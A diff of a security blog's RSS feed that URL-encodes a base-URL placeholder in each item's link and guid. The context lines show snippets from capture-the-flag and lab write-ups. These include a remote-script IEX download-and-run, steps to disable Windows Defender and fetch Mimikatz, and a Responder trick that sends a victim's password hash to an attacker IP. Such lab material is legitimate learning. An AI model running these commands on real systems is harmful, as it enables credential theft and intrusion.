@@ -6473,10 +6473,10 @@ brew install &ndash;with-jansson &ndash;HEAD universal-ctags/universal-ctags</p>
         
         <item>
             <title>HTB - Shocker</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-shocker/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-shocker/</link>
             <pubDate>Wed, 30 Sep 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-shocker/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-shocker/</guid>
             <description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  # Nmap 7.80 scan initiated Sun Sep 6 11:36:23 2020 as: nmap -v -Pn -sC -sV -oA nmap/shocker 10.10.10.56 Nmap scan report for 10.10.10.56 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-server-header: Apache/2.</description>
             <content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -6926,10 +6926,10 @@ root
         
         <item>
             <title>HTB - Buff</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-buff/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-buff/</link>
             <pubDate>Sun, 27 Sep 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-buff/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-buff/</guid>
             <description>nmap 1 2 3 4 5 6 7 8 9 10 11  _ buff nmap -p- -T4 --min-rate=3000 10.10.10.198 -Pn PORT STATE SERVICE 8080/tcp open http-proxy _ buff nmap -sC -sV -Pn -p8080 10.10.10.198 PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n&amp;#39;s Bro Hut   gobuster 1  _ buff gobuster dir -u http://10.</description>
             <content type="html"><![CDATA[<h2 id="nmap">nmap</h2>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -7759,10 +7759,10 @@ payload <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">648</s
         
         <item>
             <title>HTB - Admirer</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-admirer/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-admirer/</link>
             <pubDate>Sat, 26 Sep 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-admirer/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-admirer/</guid>
             <description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  _ admirer nmap -p- --min-rate=3000 -T4 10.10.10.187 [...] PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http _ admirer nmap -sC -sV -p21,22,80 10.10.10.187 [...] PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) |_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) 80/tcp open http Apache httpd 2.</description>
             <content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -8113,10 +8113,10 @@ cat /root/root.txt
         
         <item>
             <title>HTB - Sense</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-sense/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-sense/</link>
             <pubDate>Tue, 22 Sep 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-sense/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-sense/</guid>
             <description>nmap 1 2 3 4 5 6 7 8  _ sense nmap -p- --min-rate=5000 -T4 10.10.10.60 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 20:06 HKT Nmap scan report for 10.10.10.60 Host is up (0.055s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https   Website is pfsense login page
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  _ sense gobuster dir -k -u https://10.</description>
             <content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
@@ -8372,10 +8372,10 @@ encoded_stager <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">
         
         <item>
             <title>HTB - Nibbles</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-nibbles/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-nibbles/</link>
             <pubDate>Sat, 19 Sep 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-nibbles/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-nibbles/</guid>
             <description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # Nmap 7.80 scan initiated Sat Sep 19 13:21:01 2020 as: nmap -sC -sV -oA nmap/nibbles -Pn 10.10.10.75 Nmap scan report for 10.10.10.75 Host is up (0.047s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.</description>
             <content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -8834,10 +8834,10 @@ cat /root/root.txt
         
         <item>
             <title>HTB - Optimum</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-optimum/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-optimum/</link>
             <pubDate>Sat, 19 Sep 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-optimum/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-optimum/</guid>
             <description>Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13  ctf@014202efa8c8:~/htb/optimus$ nmap -sC -sV -oA nmap/optimus -p80 10.10.10.8 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 23:06 HKT Nmap scan report for 10.10.10.8 Host is up (0.066s latency). PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.</description>
             <content type="html"><![CDATA[<h1 id="nmap">Nmap</h1>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -9709,10 +9709,10 @@ optimum<span style="color:#f1fa8c">\k</span>ostas
         
         <item>
             <title>HTB - Sunday</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-sunday/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-sunday/</link>
             <pubDate>Sat, 19 Sep 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-sunday/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-sunday/</guid>
             <description>nmap Quick scan
 1 2 3 4 5 6 7  nmap -p- -T4 --min-rate=5000 10.10.10.76 PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 22022/tcp open unknown 41931/tcp open unknown 64172/tcp open unknown   Most notable is finger
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  &amp;gt;nmap -p79,111,22022,41931,64172 -sC -sV -oA nmap/sunday 10.10.10.76 Starting Nmap 7.80 ( https://nmap.</description>
@@ -10094,10 +10094,10 @@ root@sunday:~# cat /root/root.txt
         
         <item>
             <title>HTB - Tenten</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-tenten/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-tenten/</link>
             <pubDate>Sat, 19 Sep 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-tenten/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/09/htb-tenten/</guid>
             <description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # Nmap 7.60 scan initiated Fri Feb 28 10:29:31 2020 as: nmap -sC -sV -oA nmap/tenten 10.10.10.10 Nmap scan report for tenten.htb (10.10.10.10) Host is up (0.24s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA) | 256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA) |_ 256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (EdDSA) 80/tcp open http Apache httpd 2.</description>
             <content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -10527,10 +10527,10 @@ root@tenten:~# cat /root/root.txt
         
         <item>
             <title>CommandoVM Preparation</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/05/commandovm-preparation/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/05/commandovm-preparation/</link>
             <pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/05/commandovm-preparation/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/05/commandovm-preparation/</guid>
             <description>prepare your windowsVM  Download OVA from https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/ Install French keyboard Windows update Disable Tamper protection from Windows Defender  https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-windows-defender-antivirus.html   Reboot Snapshot your VM : &amp;ldquo;Before-Commando-VM&amp;rdquo;  1  Set-ExecutionPolicy Unrestricted   Install CommandoVM  Download and Execute Commander VM by Mandiant  1  IEX(new-object net.webclient).downloadstring(&amp;#39;https://raw.githubusercontent.com/fireeye/commando-vm/master/install.ps1&amp;#39;)   Failed to install 1 2  cinst dnSpy.fireeye x64dgb.fireeye proxycap.fireeye metasploit.fireeye amass.docker.fireeye PoshC2.fireeye spiderfoot.docker.fireeye wfuzz.fireeye watson.fireeye PwndPasswordsNTLM.fireeye mimikatz.</description>
             <content type="html"><![CDATA[<h2 id="prepare-your-windowsvm">prepare your windowsVM</h2>
 <ul>
@@ -10649,10 +10649,10 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Prof
         
         <item>
             <title>Mimikatz</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/05/mimikatz/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/05/mimikatz/</link>
             <pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/05/mimikatz/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/05/mimikatz/</guid>
             <description>Identification of the processor architecture
 1 2  PS C:\users\administrator\Music&amp;gt; $env:PROCESSOR_ARCHITECTURE AMD64   Upload mimikatz
 1 2 3  wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200208/mimikatz_trunk.zip unzip mimikatz_trunk.zip -d mimikatz cp mimikatz/x64/mimikatz.exe http/   We download Mimikatz and execute after having disabled Windows Defender
@@ -11074,10 +11074,10 @@ SUCCESS: The process <span style="color:#f1fa8c">&#34;mimikatz.exe&#34;</span> w
         
         <item>
             <title>Responder</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/05/responder/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/05/responder/</link>
             <pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/05/responder/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/05/responder/</guid>
             <description>Installation My docker environment do not have access to utun4 Kali Responder
 1 2 3 4 5  git clone https://github.com/lgandx/Responder.git cd Responder sudo python Responder.py -i 10.10.14.73 -wrf [...] [+] Listening for events...   Then from the victim side, we use powershell to attempt collecting the password hash of the current user:
 1  Get-Content \\10.10.14.73\randomFileName   Responder will intercept the following hash
@@ -11172,10 +11172,10 @@ hashcat --example-hashes &gt; /tmp/hashes.txt
         
         <item>
             <title>HTB - Lame</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/04/htb-lame/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/04/htb-lame/</link>
             <pubDate>Sat, 11 Apr 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/04/htb-lame/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/04/htb-lame/</guid>
             <description>Reckon interesting ports are FTP, SSH, SMB
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  # Nmap 7.60 scan initiated Fri Feb 21 07:12:06 2020 as: nmap -sV -sC -oA nmap/lame -Pn 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up (0.</description>
             <content type="html"><![CDATA[<h1 id="reckon">Reckon</h1>
@@ -11629,10 +11629,10 @@ sh-3.2#
         
         <item>
             <title>HTB - Legacy</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/04/htb-legacy/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/04/htb-legacy/</link>
             <pubDate>Sat, 11 Apr 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/04/htb-legacy/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/04/htb-legacy/</guid>
             <description>Reconnaissance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  # Nmap 7.60 scan initiated Fri Feb 21 02:26:34 2020 as: nmap -Pn -sC -sV -oA nmap/legacy 10.10.10.4 Nmap scan report for 10.10.10.4 Host is up (0.24s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: 5d01h59m29s, deviation: 0s, median: 5d01h59m29s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:65:1e (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\x00 | Workgroup: HTB\x00 |_ System time: 2020-02-26T06:27:07+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed.</description>
             <content type="html"><![CDATA[<h1 id="reconnaissance">Reconnaissance</h1>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
@@ -12049,10 +12049,10 @@ meterpreter &gt; download <span style="color:#f1fa8c">&#34;C:\Documents and Sett
         
         <item>
             <title>HTB - Popcorm</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/04/htb-popcorm/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/04/htb-popcorm/</link>
             <pubDate>Sat, 11 Apr 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/04/htb-popcorm/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/04/htb-popcorm/</guid>
             <description>Reckon Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # Nmap 7.60 scan initiated Fri Feb 21 14:21:08 2020 as: nmap -A -T4 -oA nmap/popcorn 10.10.10.6 Nmap scan report for 10.10.10.6 Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA) |_ 2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA) 80/tcp open http Apache httpd 2.</description>
             <content type="html"><![CDATA[<h1 id="reckon">Reckon</h1>
 <h2 id="nmap">Nmap</h2>
@@ -12516,10 +12516,10 @@ root@popcorn:/var/www/torrent/upload# cat /root/root.txt
         
         <item>
             <title>HTB - Json</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/03/htb-json/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/03/htb-json/</link>
             <pubDate>Thu, 05 Mar 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/03/htb-json/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/03/htb-json/</guid>
             <description>RECKON  220-FileZilla Server 0.9.60 beta Microsoft IIS httpd 8.5 =&amp;gt; Windows Server 2012 hostname = JSON message_signing: disabled (dangerous, but default) or not required Website with multiple Dead links: javascripts, images &amp;hellip;  1 2  smbclient -L \\10.10.10.158 -n session setup failed: NT_STATUS_ACCESS_DENIED   Connecting Burp-Suite, We can intercept the Login HTTP request, click Action: Send to repeater
 1 2 3 4 5 6 7 8 9 10 11 12 13  POST /api/token HTTP/1.</description>
             <content type="html"><![CDATA[<h1 id="reckon">RECKON</h1>
@@ -13558,10 +13558,10 @@ ftp&gt; bye
         
         <item>
             <title>HTB - Re</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/02/htb-re/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/02/htb-re/</link>
             <pubDate>Thu, 20 Feb 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/02/htb-re/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/02/htb-re/</guid>
             <description>RECONNAISSANCE Only two ports open: http 80 and smb 445
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # Nmap 7.60 scan initiated Mon Feb 10 13:23:35 2020 as: nmap -sC -sV -oA nmap/RE 10.10.10.144 Nmap scan report for re.htb (10.10.10.144) Host is up (0.16s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.</description>
             <content type="html"><![CDATA[<h1 id="reconnaissance">RECONNAISSANCE</h1>
@@ -15872,10 +15872,10 @@ UsoSvc
         
         <item>
             <title>HTB - Ai</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/02/htb-ai/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/02/htb-ai/</link>
             <pubDate>Mon, 10 Feb 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/02/htb-ai/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/02/htb-ai/</guid>
             <description>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # Nmap 7.60 scan initiated Sun Feb 2 09:57:19 2020 as: nmap -sC -sV -oA nmap/AI 10.10.10.163 Nmap scan report for 10.10.10.163 Host is up (0.26s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA) | 256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA) |_ 256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (EdDSA) 80/tcp open http Apache httpd 2.</description>
             <content type="html"><![CDATA[<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
@@ -16404,10 +16404,10 @@ root@AI:~#
         
         <item>
             <title>HTB - Obtain an invitation code on hackthebox.eu</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2020/02/htb-obtain-an-invitation-code-on-hackthebox.eu/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/02/htb-obtain-an-invitation-code-on-hackthebox.eu/</link>
             <pubDate>Sat, 01 Feb 2020 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2020/02/htb-obtain-an-invitation-code-on-hackthebox.eu/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2020/02/htb-obtain-an-invitation-code-on-hackthebox.eu/</guid>
             <description>Obtain an invitation code to hackthebox.eu Nobody will send you an invitation code so it is advised to hack in the website to generate yout own invitation code.
 While it is certainly easier to do it with Firefox developer tools, I have written the following python3 script get-htb-invitation-code.py for the sake of programming.
 in Developer tools Debugger tab, we see an inviteapi.min.js which contains a packed code to call some javascript.</description>
@@ -16508,10 +16508,10 @@ code <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</s
         
         <item>
             <title>Kringlecon 2019</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/kringlecon-2019/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/kringlecon-2019/</link>
             <pubDate>Wed, 25 Dec 2019 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/kringlecon-2019/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/kringlecon-2019/</guid>
             <description>Solved mini-challenges  Escape Ed   CTRL-D  Objective 1)   Turtle doves are in the student union near the chimney  Objective 2) Unredact Threatening Document   Found the letter North-West of the Quad The document is a PDF with hidden text; however just copy paste of the hidden section will reveal the Capital word we are looking for  Alabaster snowball   sudo - l we can execute with root privileges the command chattr chattr command can be used to add/remove attributes on a file looking at /etc/passwd we can see the default shell is not /bin/bash but /bin/nsh, however we don&amp;rsquo;t have write access lsattr /bin/nsh show the immutable &amp;lsquo;i&amp;rsquo; flag attribute is activated remove the immutable flag with chattr -i /bin/nsh overwrite /bin/nsh with /bin/bash su - alabaster_snowball with Password2  Tangle Coalbox: password is 7331   one digit is repeated once we have to type a prime number looking at the keypad, we see 1,3,7 and Enter are used the most I wrote a combi.</description>
             <content type="html"><![CDATA[<h2 id="solved-mini-challenges">Solved mini-challenges</h2>
 <ol>
@@ -18418,10 +18418,10 @@ cat bad_ips | sort | uniq | tr -d <span style="color:#f1fa8c">&#39;&#34;&#39;</s
         
         <item>
             <title>picoCTF 2018 - Binary Exploitation</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-binary-exploitation/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-binary-exploitation/</link>
             <pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-binary-exploitation/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-binary-exploitation/</guid>
             <description>buffer-overflow-0  source: vuln.c binary: vuln  The below code is vulnerable to bufferoverflow as input can be bigger then the 16 bytes buffer size
 1 2 3 4  void vuln(char *input){ char buf[16]; strcpy(buf, input); }    ./vuln XXXXXXXXXXXXXXXXXXXX
  buffer-overflow-1  source: vuln.c binary: vuln  The below code is vulnerable to overflow attack because gets cannot know in advance whether the size of the user input will be bigger then BUFSIZE</description>
@@ -21031,10 +21031,10 @@ p<span style="color:#ff79c6">.</span>interactive()
         
         <item>
             <title>picoCTF 2018 - Cryptography</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-cryptography/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-cryptography/</link>
             <pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-cryptography/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-cryptography/</guid>
             <description>Crypto-warmup-1 The fastest way is pip install pycipher
 1 2 3 4 5 6 7 8  pip install pycipher python2 &amp;gt;&amp;gt;&amp;gt; c = &amp;#39;llkjmlmpadkkc&amp;#39;.upper() &amp;gt;&amp;gt;&amp;gt; k = &amp;#39;thisisalilkey&amp;#39;.upper() &amp;gt;&amp;gt;&amp;gt; from pycipher import Vigenere &amp;gt;&amp;gt;&amp;gt; plaintext = Vigenere(k).decipher(c) &amp;gt;&amp;gt;&amp;gt; print plaintext SECRETMESSAGE   We can also code ourselves but it takes a bit more time ;)
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  #!</description>
@@ -21421,10 +21421,10 @@ cleartext <span style="color:#ff79c6">=</span> ctext<span style="color:#ff79c6">
         
         <item>
             <title>picoCTF 2018 - Forensics</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-forensics/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-forensics/</link>
             <pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate>
             
-            <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-forensics/</guid>
+            <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-forensics/</guid>
             <description>forensics-warmup-001 We download a zipfile with the command curl -Ok url. The -k switch allows to by-pass ssl certificates checking when downloading a file in TLS (with https). we first check the zipfile with the command file: it&amp;rsquo;s indeed effectively a zip so we can unzip and explore the content. Apparently there is an image, we open it with eog and we can observe the flag
 1 2 3 4  curl -Ok https://&amp;lt;URL&amp;gt;/flag.</description>
             <content type="html"><![CDATA[<h2 id="forensics-warmup-001">forensics-warmup-001</h2>
@@ -21828,10 +21828,10 @@ Correct!
         
         <item>
             <title>picoCTF 2018 - General Skills</title>
-            <link>https://0xade1.github.io/$DEV_BASEURL/posts/2019/12/picoctf-2018-general-skills/</link>
+            <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2019/12/picoctf-2018-general-skills/</link>
             <pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate>
             
